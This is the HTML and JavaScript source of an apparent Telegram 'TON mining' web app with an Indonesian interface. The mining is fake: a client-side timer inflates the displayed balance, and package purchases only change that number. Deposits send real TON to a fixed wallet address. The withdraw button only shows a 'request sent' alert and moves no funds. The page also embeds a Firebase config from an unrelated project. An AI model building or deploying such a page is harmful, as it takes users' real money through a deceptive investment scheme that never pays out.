<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MBTminer - Professional TON Mining</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background: #020617; color: #f8fafc; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
        .mining-glow { box-shadow: 0 0 20px rgba(56, 189, 248, 0.2); }
        .nav-active { color: #38bdf8 !important; border-top: 2px solid #38bdf8; }
        .hidden { display: none; }
        @keyframes fade { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .animate-fade { animation: fade 0.3s ease-out forwards; }
    </style>
</head>
<body class="pb-24">

    <header class="p-5 flex justify-between items-center border-b border-slate-800 bg-slate-950/50 sticky top-0 z-50 glass">
        <div>
            <h1 class="text-2xl font-black tracking-tighter text-sky-400">MBT<span class="text-white">MINER</span></h1>
            <p id="user-name" class="text-[10px] text-slate-400 uppercase tracking-widest leading-none">Loading User...</p>
        </div>
        <div class="text-right">
            <p class="text-[10px] text-slate-500 font-bold uppercase">Balance</p>
            <div class="flex items-center gap-2">
                <img src="https://cryptologos.cc/logos/toncoin-ton-logo.png" class="w-4 h-4" alt="ton">
                <span id="balance" class="text-xl font-mono font-bold text-green-400">0.000000</span>
            </div>
        </div>
    </header>

    <main class="p-4 space-y-6">
        
        <section id="dashboard" class="content-section animate-fade">
            <div class="glass p-6 rounded-3xl mining-glow text-center space-y-4">
                <div class="relative inline-block">
                    <div class="w-32 h-32 rounded-full border-4 border-sky-500/30 flex items-center justify-center mx-auto">
                        <i class="fas fa-microchip text-5xl text-sky-400 animate-pulse"></i>
                    </div>
                </div>
                <div>
                    <p class="text-slate-400 text-sm">Mining Speed</p>
                    <p id="current-speed" class="text-2xl font-bold">0.00001 <span class="text-xs text-sky-500">TON/MIN</span></p>
                </div>
                <div class="grid grid-cols-2 gap-3 pt-4">
                    <button onclick="showSection('deposit')" class="bg-sky-600 p-3 rounded-2xl font-bold text-sm transition-transform active:scale-95">DEPOSIT</button>
                    <button onclick="showSection('withdraw')" class="bg-slate-800 p-3 rounded-2xl font-bold text-sm transition-transform active:scale-95">WITHDRAW</button>
                </div>
            </div>
        </section>

        <section id="shop" class="content-section hidden animate-fade space-y-4">
            <h2 class="text-xl font-bold px-2 text-sky-400">Mining Packages</h2>
            <div class="glass p-5 rounded-2xl flex justify-between items-center">
                <div><h3 class="font-bold">Pemula</h3><p class="text-xs text-slate-400">0.01 TON/Min</p></div>
                <button onclick="buyPackage(1, 0.01)" class="bg-sky-500 px-4 py-2 rounded-xl text-sm font-bold">1 TON</button>
            </div>
            <div class="glass p-5 rounded-2xl flex justify-between items-center">
                <div><h3 class="font-bold">Normal</h3><p class="text-xs text-slate-400">0.1 TON/Min</p></div>
                <button onclick="buyPackage(5, 0.1)" class="bg-sky-500 px-4 py-2 rounded-xl text-sm font-bold">5 TON</button>
            </div>
            <div class="glass p-5 rounded-2xl flex justify-between items-center border-yellow-500/20">
                <div><h3 class="font-bold text-yellow-400">Reguler</h3><p class="text-xs text-slate-400">0.5 TON/Min</p></div>
                <button onclick="buyPackage(15, 0.5)" class="bg-yellow-600 px-4 py-2 rounded-xl text-sm font-bold">15 TON</button>
            </div>
        </section>

        <section id="deposit" class="content-section hidden animate-fade">
            <div class="glass p-6 rounded-3xl space-y-6 text-center">
                <h2 class="text-xl font-bold text-sky-400">Deposit TON</h2>
                <div id="ton-connect-button" class="flex justify-center"></div>
                <div id="deposit-form" class="hidden space-y-4">
                    <input type="number" id="deposit-amount" placeholder="Jumlah TON" class="w-full bg-slate-950 border border-slate-700 p-3 rounded-xl text-center text-lg font-bold outline-none focus:border-sky-500">
                    <button onclick="sendTransaction()" class="w-full bg-sky-600 py-4 rounded-2xl font-bold shadow-lg shadow-sky-900/40 active:scale-95">KONFIRMASI BAYAR</button>
                </div>
                <p id="wallet-status" class="text-[10px] text-slate-500">Hubungkan wallet untuk deposit</p>
                <button onclick="showSection('dashboard')" class="text-xs text-slate-500 uppercase">Kembali</button>
            </div>
        </section>

        <section id="withdraw" class="content-section hidden animate-fade">
            <div class="glass p-6 rounded-3xl space-y-4">
                <h2 class="text-xl font-bold text-red-400">Withdrawal</h2>
                <input type="text" placeholder="UQ Wallet Address" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-xl text-sm outline-none">
                <input type="number" placeholder="Min 10 TON" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-xl text-sm outline-none">
                <button onclick="alert('Permintaan terkirim!')" class="w-full bg-red-600 py-3 rounded-xl font-bold">WITHDRAW</button>
            </div>
        </section>
    </main>

    <nav class="fixed bottom-0 w-full glass border-t border-slate-800 flex justify-around p-4 z-50">
        <button onclick="showSection('dashboard')" class="flex flex-col items-center gap-1 nav-active text-slate-400">
            <i class="fas fa-home"></i><span class="text-[10px]">Home</span>
        </button>
        <button onclick="showSection('shop')" class="flex flex-col items-center gap-1 text-slate-400">
            <i class="fas fa-shopping-cart"></i><span class="text-[10px]">Shop</span>
        </button>
        <button onclick="showSection('deposit')" class="flex flex-col items-center gap-1 text-slate-400">
            <i class="fas fa-plus-circle"></i><span class="text-[10px]">Topup</span>
        </button>
        <button onclick="showSection('withdraw')" class="flex flex-col items-center gap-1 text-slate-400">
            <i class="fas fa-wallet"></i><span class="text-[10px]">Payout</span>
        </button>
    </nav>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, getDoc, setDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCyMnLJJo2QTZZ7cBGigtj0BNNfqjHngvU",
            authDomain: "loveclicker-86b7e.firebaseapp.com",
            projectId: "loveclicker-86b7e",
            storageBucket: "loveclicker-86b7e.firebasestorage.app",
            messagingSenderId: "219092692738",
            appId: "1:219092692738:web:f4dd71eee14a9024f59c1b"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const tg = window.Telegram.WebApp;
        tg.ready();

        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp-with-react/master/public/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        const userId = tg.initDataUnsafe?.user?.id?.toString() || "guest_user";
        document.getElementById('user-name').innerText = tg.initDataUnsafe?.user?.first_name || "GUEST ACCOUNT";

        let userBalance = 0;
        let userSpeed = 0.00001;

        async function initData() {
            const userRef = doc(db, "users", userId);
            const userSnap = await getDoc(userRef);
            if (userSnap.exists()) {
                userBalance = userSnap.data().balance;
                userSpeed = userSnap.data().speed;
                document.getElementById('current-speed').innerText = `${userSpeed} TON/MIN`;
            } else {
                await setDoc(userRef, { balance: 0, speed: 0.00001 });
            }
        }

        setInterval(async () => {
            userBalance += (userSpeed / 60);
            document.getElementById('balance').innerText = userBalance.toFixed(6);
            if (Math.floor(Date.now()/1000) % 15 === 0) {
                await updateDoc(doc(db, "users", userId), { balance: userBalance });
            }
        }, 1000);

        window.buyPackage = async (price, speed) => {
            if (userBalance >= price) {
                userBalance -= price; userSpeed = speed;
                await updateDoc(doc(db, "users", userId), { balance: userBalance, speed: userSpeed });
                alert("Upgrade Berhasil!"); location.reload();
            } else { alert("Saldo Tidak Cukup!"); }
        };

        window.sendTransaction = async () => {
            const amount = document.getElementById('deposit-amount').value;
            if(!amount) return;
            const tx = {
                validUntil: Math.floor(Date.now() / 1000) + 60,
                messages: [{ address: "UQC8yBpZY5KwBftoV5SaXc43HSgyXki85iF9qNzNgF6uVNpd", amount: (amount * 1000000000).toString() }]
            };
            try {
                await tonConnectUI.sendTransaction(tx);
                alert("Transaksi Berhasil dikirim ke Blockchain!");
            } catch (e) { alert("Dibatalkan."); }
        };

        tonConnectUI.onStatusChange(wallet => {
            const form = document.getElementById('deposit-form');
            if(wallet) form.classList.remove('hidden'); else form.classList.add('hidden');
        });

        initData();
    </script>

    <script>
        function showSection(id) {
            document.querySelectorAll('.content-section').forEach(s => s.classList.add('hidden'));
            document.getElementById(id).classList.remove('hidden');
            document.querySelectorAll('nav button').forEach(b => b.classList.remove('nav-active'));
            event.currentTarget.classList.add('nav-active');
        }
    </script>
</body>
    </html>
